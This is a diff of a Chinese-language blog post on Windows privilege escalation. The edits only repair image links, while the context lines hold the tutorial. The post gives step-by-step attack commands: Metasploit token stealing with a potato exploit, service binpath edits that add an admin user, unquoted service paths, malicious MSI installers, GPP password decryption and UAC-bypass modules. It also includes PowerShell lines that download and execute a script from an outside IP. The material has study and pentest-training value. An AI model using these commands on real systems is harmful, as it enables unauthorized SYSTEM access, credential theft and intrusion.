@@ -161,7 +161,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getprivs</span><br><span class="line"></span><br><span class="line">##或者服务器的cmd下键入以下命令</span><br><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
 
 <p>如下，SeImpersonatePrivilege是土豆提权的必要条件</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png" alt="image-20231002172303135"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png" alt="image-20231002172303135"></p>
 <p>首先通过msf生成一个msf的木马，通过webshell传上去，然后执行，获取到会话，此时我们使用令牌窃取，会失败，因为此时我们只有web权限，权限太低，无法实现窃取SYSTEM权限，这个时候就需要用到烂土豆配合msf实现权限提升。我们利用webshell把下载好的烂土豆程序传到C盘根目录下，然后执行它，此时我们再通过msf的会话，使用令牌窃取功能即可成功实现从web权限到SYSTEM权限的提升。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
 
@@ -177,9 +177,9 @@
 <h2 id="Windows服务带有易受攻击的权限一"><a href="#Windows服务带有易受攻击的权限一" class="headerlink" title="Windows服务带有易受攻击的权限一"></a>Windows服务带有易受攻击的权限一</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件，从而实现权限提升。</p>
 <p>该漏洞可以通过使用微软自带的检测工具SubInACL进行检测：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">https://www.microsoft.com/en-us/download/details.aspx?id=23510</a></p>
 <p>首先将SubInACL上传到目标机器，然后对相应服务的注册表项进行检测</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723812.png" alt="image-20231002172327722"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723812.png" alt="image-20231002172327722"></p>
 <p>如上图所示，“Everyone”在这个注册表项上有完全的控制权。意味着我们可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723980.png" alt="image-20231002172342918"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723980.png" alt="image-20231002172342918"></p>
 <p>在下一次启动该服务时，payload.exe将会以SYSTEM权限运行，我们可以通过直接对目标主机执行<code>“shutdown -r -t 0”</code>命令，使其主机重启即可，在此之前我们需要先在kali上启用一个监听，用于接收反弹shell的会话。</p>
 <h2 id="Windows服务带有易受攻击的权限二"><a href="#Windows服务带有易受攻击的权限二" class="headerlink" title="Windows服务带有易受攻击的权限二"></a>Windows服务带有易受攻击的权限二</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑BINARY_PATH_NAME参数的值，如果我们将这个值修改成任何命令，那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行。如果我们愿意，我们可以添加一个本地管理员，从而实现权限提升。</p>
 <p>该漏洞可以通过使用微软自带的检测工具进行检测：</p>
@@ -187,7 +187,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;username&quot; *          //检测当前用户或者用户组是否有可以修改的服务，根据实际情况修改username</span><br></pre></td></tr></table></figure>
 
 <p>当我们执行以上命令时发现如下图所示的情况，说明此时该提权方法不可行</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021723131.png" alt="image-20231002172357091"> </p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723131.png" alt="image-20231002172357091"> </p>
 <p>如果我们对某服务的属性拥有完全控制权。那么我们通过编辑BINARY_PATH_NAME参数的值，将这个值修改成任何命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;ServiceName&quot; binpath=&quot;net user eviladmin  P4ssword0 /add&quot;   //添加一个用户 </span><br><span class="line">//在修改了binpath的值后，用“sc stop”和“sc start”命令重启服务：</span><br><span class="line">sc stop &quot;ServiceName&quot;                           //关闭服务</span><br><span class="line">sc start &quot;ServiceName&quot;                           //启动服务</span><br></pre></td></tr></table></figure>
 
@@ -196,7 +196,7 @@
 <h2 id="Trusted-Service-Paths-提权漏洞"><a href="#Trusted-Service-Paths-提权漏洞" class="headerlink" title="Trusted Service Paths 提权漏洞"></a>Trusted Service Paths 提权漏洞</h2><p>漏洞原理：如果一个服务的可执行文件的路径没有被双引号引起来并且包含空格，那么这个服务就是有漏洞的，该漏洞利用了windows文件路径解析的特性并涉及服务路径的文件&#x2F;文件夹权限配置。</p>
 <p><strong>windows文件路径解析的特性：</strong></p>
 <p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724137.png" alt="image-20231002172410084"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724137.png" alt="image-20231002172410084"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径没有包含在引号中，服务会按照以下顺序依次执行</span><br><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure>
 
 <p>假如存在漏洞路径，我们可以将msf木马放到上面的c:\program.exe、c:\program files.exe、c:\program files (x86)\grasssoft\macro.exe路径下，然后重启机器，此时，反弹回来的shell，就是一个system权限的shell（windows服务通常以System权限运行，所以提供在解析服务所对应的文件路径中的空格时也是以系统权限运行的）。</p>
@@ -236,14 +236,14 @@
 <h3 id="MSI-Wrapper工具下的利用"><a href="#MSI-Wrapper工具下的利用" class="headerlink" title="MSI Wrapper工具下的利用"></a>MSI Wrapper工具下的利用</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
 <p>MSI Wrapper是一个强大的MSI安装包的生产工具。它有一个友好的图形用户界面，操作简单直观，各种功能齐全，不需要任何知识的脚本可以产生满足要求的Windows安装程序安装程序。</p>
 <p>（1）将Payload设置为执行shell.exe(一个msf马)：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724668.png" alt="image-20231002172445595"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724668.png" alt="image-20231002172445595"></p>
 <p>（2）设置为运行时要求提升权限：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021724842.png" alt="image-20231002172456771"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724842.png" alt="image-20231002172456771"></p>
 <p>Application Id随便选：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725610.png" alt="image-20231002172509514"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725610.png" alt="image-20231002172509514"></p>
 <p>其他配置按照默认设置即可，最后在你设置的output目录中生成了shell.msi</p>
 <p>将生成的shell.msi上传到目标主机中，并开启一个新的msf监听，然后在shell中执行开shell.msi文件:</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725594.png" alt="image-20231002172521447"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725594.png" alt="image-20231002172521447"></p>
 <p>如上图，成功获得system权限。</p>
 <p>对于该漏洞，通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权了</p>
 <h2 id="AccessChk使用"><a href="#AccessChk使用" class="headerlink" title="AccessChk使用"></a>AccessChk使用</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
@@ -258,17 +258,17 @@
 <p>找出某个驱动器下所有权限配置有缺陷的文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725234.png" alt="image-20231002172552184"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725234.png" alt="image-20231002172552184"></p>
 <p>如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。</p>
 <p>根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。</p>
 <p>你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等</p>
 <h2 id="Windows组策略首选项提权"><a href="#Windows组策略首选项提权" class="headerlink" title="Windows组策略首选项提权"></a>Windows组策略首选项提权</h2><p>SYSVOL是活动目录里面的一个用于<strong>存储公共文件服务器副本</strong>的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存<strong>放登录脚本、组策略数据及其他域控制器需要的域信息</strong>等。SYSVOL在所有经过身份验证的域用户或者域信任用户范围内共享，都可以读取。整个SYSVOL目录在所有的域控制器中是自动同步共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021726263.png" alt="image-20231002172650199"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021727516.png" alt="image-20231002172702461"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021726263.png" alt="image-20231002172650199"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021727516.png" alt="image-20231002172702461"></p>
 <p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，<strong>网络管理员往往会使用域策略进行统一的配置和管理</strong>。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会利用组策略去批量修改本地管理员密码。<strong>但是这样就会出现一个问题，所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码，黑客就可以获取他们所有机器的管理权限。</strong></p>
 <p><strong>管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。</strong>该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机</p>
 <p>我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728676.png" alt="image-20231002172821624"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021728676.png" alt="image-20231002172821624"></p>
 <p>如上图可以看到其中的cpassword项，保存的是加密后的内容，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
 <p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
 <p>借助该私钥，我们就能还原出明文</p>
@@ -293,7 +293,7 @@
 <p>假冒令牌可以假冒一个网络中的另一个用户进行各类类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
 <h3 id="Metasploit下的令牌窃取"><a href="#Metasploit下的令牌窃取" class="headerlink" title="Metasploit下的令牌窃取"></a>Metasploit下的令牌窃取</h3><p>需要我们已经获取了目标主机一个administrator权限的meterpreter，需要提前至system，我们可以用metasploit的incognito模块窃取令牌</p>
 <p>如下，输入 <code>use incognito</code> 来先加载incognito模块，然后输入<code>list_tokens -u</code> 命令即可列出可用的访问令牌：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728708.png" alt="image-20231002172837563"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021728708.png" alt="image-20231002172837563"></p>
 <p>可以看到，这里的Windows访问令牌有两种类型：</p>
 <blockquote>
 <p><strong>Delegation Token</strong>：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)</p>
@@ -303,27 +303,27 @@
 <p>这里，我们可以看到列出了三个授权令牌，我们执行如下命令，就可以伪造NT AUTHORITY\SYSTEM令牌，来模拟SYSTEM用户了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729757.png" alt="image-20231002172919654"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729757.png" alt="image-20231002172919654"></p>
 <p>注意： <code>list_tokens -u</code> 命令列出的令牌取决于你获得的meterpreter的访问级别，这里我们测试的是管理员权限到system权限，如果我们获取的用户不是管理员而是普通用户权限，也有可能列出相应的高权限令牌。</p>
 <p>此外，我们还可以利用 steal_token <pid> 命令从相应的进程中窃取令牌。先执行 ps 找到User为SYSTEM或管理员的进程，并记下其进程的PID，然后执行 steal_token <pid> ：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729060.png" alt="image-20231002172934952"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729060.png" alt="image-20231002172934952"></p>
 <p>Metasploit incognito模块的相关命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看当前令牌(token)</span><br><span class="line">use incognito # 加载incognito模块</span><br><span class="line">list_tokens -u # 列出访问令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span><br><span class="line">steal_token 1252 # 从进程窃取token</span><br><span class="line">getsystem # 提升至system权限</span><br><span class="line">rev2self # 返回到之前的AccessToken权限</span><br></pre></td></tr></table></figure>
 
 <h3 id="incognito-exe工具下的令牌窃取"><a href="#incognito-exe工具下的令牌窃取" class="headerlink" title="incognito.exe工具下的令牌窃取"></a>incognito.exe工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
 <p>incognito.exe工具也可以用来进行令牌窃取。</p>
 <p>首先在目标主机上上传incognito.exe：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729647.png" alt="image-20231002172947524"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729647.png" alt="image-20231002172947524"></p>
 <p>然后进入shell，执行如下命令列举存在的访问令牌：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730099.png" alt="image-20231002173001855"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021730099.png" alt="image-20231002173001855"></p>
 <p>然后我们就可以通过执行如下命令窃取令牌来模拟其他用户：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; &lt;要执行的命令&gt;</span><br><span class="line">例如执行whoami命令：</span><br><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; whoami</span><br><span class="line"></span><br><span class="line">例如：模拟SYSTEM权限用户：</span><br><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">降权至当前用户：</span><br><span class="line">incognito.exe execute -c &quot;当前用户token&quot; cmd.exe</span><br></pre></td></tr></table></figure>
 
 <p>但是这里由于我们是在meterpreter的shell中执行的系统命令，其没有回显(时间好长啊)，我们可以直接上传一个msf马和incognito.exe，然后利用窃取的令牌所获得的system权限来执行我们所上传的msf马，从而从新获得一个system权限的meterpreter，如下图，成功获得了一个system权限的meterpreter：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730178.png" alt="image-20231002173034113"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731409.png" alt="image-20231002173112204"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021730178.png" alt="image-20231002173034113"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731409.png" alt="image-20231002173112204"></p>
 <h3 id="Rotten-Potato工具下的令牌窃取"><a href="#Rotten-Potato工具下的令牌窃取" class="headerlink" title="Rotten Potato工具下的令牌窃取"></a>Rotten Potato工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
 <p>见上面的烂土豆</p>
 <h3 id="PowerShell下的令牌窃取"><a href="#PowerShell下的令牌窃取" class="headerlink" title="PowerShell下的令牌窃取"></a>PowerShell下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
@@ -331,29 +331,29 @@
 <p>首先执行如下命令列举token:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -Enumerate</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731905.png" alt="image-20231002173132830"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731905.png" alt="image-20231002173132830"></p>
 <p>如上图，成功列举出了token。然后执行如下命令窃取system的token：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731315.png" alt="image-20231002173149261"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731315.png" alt="image-20231002173149261"></p>
 <p>如上图，执行命令后，成功弹出了一个system权限的shell。</p>
 <p>不仅如此，我们还可以从进程中窃取令牌token，首先查看高权限的进程：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732749.png" alt="image-20231002173200695"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732749.png" alt="image-20231002173200695"></p>
 <p>然后执行如下命令从进程中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 2504</span><br></pre></td></tr></table></figure>
 
 <p>如下图，成功：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732832.png" alt="image-20231002173210778"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732832.png" alt="image-20231002173210778"></p>
 <h3 id="利用令牌获得TrustedInstaller权限"><a href="#利用令牌获得TrustedInstaller权限" class="headerlink" title="利用令牌获得TrustedInstaller权限"></a>利用令牌获得TrustedInstaller权限</h3><p>有时候，在Windows系统中即使获得了管理员权限和SYSTEM权限，也不能修改系统文件，因为Windows系统的最高权限为 TrustedInstaller 权限。</p>
 <p>例如 <code>C:\Windows\servicing</code>路径，即使使用SYSTEM权限也无法在该路径进行读写文件：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732501.png" alt="image-20231002173221452"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732501.png" alt="image-20231002173221452"></p>
 <p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，位置位于<code>C:\Windows\servicing\TrustedInstaller.exe</code> ，我们可以用 Get-Acl 查看该程序的权限：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe</span><br><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>Powershell中有一个Get-Acl命令，这个命令是用来获取资源安全描述的命令，可以用来查看文件的权限。</p>
 </blockquote>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732645.png" alt="image-20231002173233597"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732645.png" alt="image-20231002173233597"></p>
 <p>我们可以看到该程序的权限(所属用户)为NT SERVICE\TrustedInstaller。</p>
 <p>那我们的思路就是，借用TrustedInstaller.exe的token令牌创建子进程，这样子进程就有了TrustedInstaller权限。</p>
 <p>思路如下：</p>
@@ -366,25 +366,25 @@
 <p>首先进入shell启动TrustedInstaller服务：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732443.png" alt="image-20231002173246268"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732443.png" alt="image-20231002173246268"></p>
 <p>然后执行如下即可：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps # 找到TrustedInstaller的进程PID，这里为2180</span><br><span class="line">steal_token &lt;PID&gt; # 从该进程中窃取令牌</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
 
 <p>可以看到在窃取TrustedInstaller的令牌前，对C:\Windows\servicing目录没有写权限：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733431.png" alt="image-20231002173302258"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733431.png" alt="image-20231002173302258"></p>
 <p>而窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733052.png" alt="image-20231002173314903"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733052.png" alt="image-20231002173314903"></p>
 <p><strong>（2）在PowerShell下使用Invoke-TokenManipulation.ps1脚本测试</strong></p>
 <p>代码执行如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 启动TrustedInstaller服务</span><br><span class="line"></span><br><span class="line">$id = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process&#123;$_.id&#125;</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.101.219.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId $id</span><br></pre></td></tr></table></figure>
 
 <p>窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733183.png" alt="image-20231002173329094"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733183.png" alt="image-20231002173329094"></p>
 <p>这里，在成功窃取TrustedInstaller的令牌后会发现自己的权限仍是NT AUTHORITY\SYSTEM，这是因为TrustedInstaller权限也会显示为NT AUTHORITY\SYSTEM，执行下面这个命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups | findstr TrustedInstaller</span><br></pre></td></tr></table></figure>
 
 <p>如果有回显，代表当前是TrustedInstaller权限：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734216.png" alt="image-20231002173409153"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734216.png" alt="image-20231002173409153"></p>
 <h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC，即用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
 <p>使用 UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
 <p><strong>UAC如何运行？</strong></p>
@@ -392,14 +392,14 @@
 <h3 id="Metasploit下的绕过UAC提权"><a href="#Metasploit下的绕过UAC提权" class="headerlink" title="Metasploit下的绕过UAC提权"></a>Metasploit下的绕过UAC提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ask # 弹出UAC确认窗口，然后诱使用户点击后获得system权限</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac # 此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_injection # 此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_fodhelper # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10的UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_eventvwr # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_comhijack # 此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。</span><br></pre></td></tr></table></figure>
 
 <p>以上模块都是从meterpreter中设置好session执行完后，绕过UAC，获得一个关闭了UAC的第二个shell，再在这个关闭了UAC的第二个shell中执行 getsystem 即可完成提权。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734294.png" alt="image-20231002173430063"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734294.png" alt="image-20231002173430063"></p>
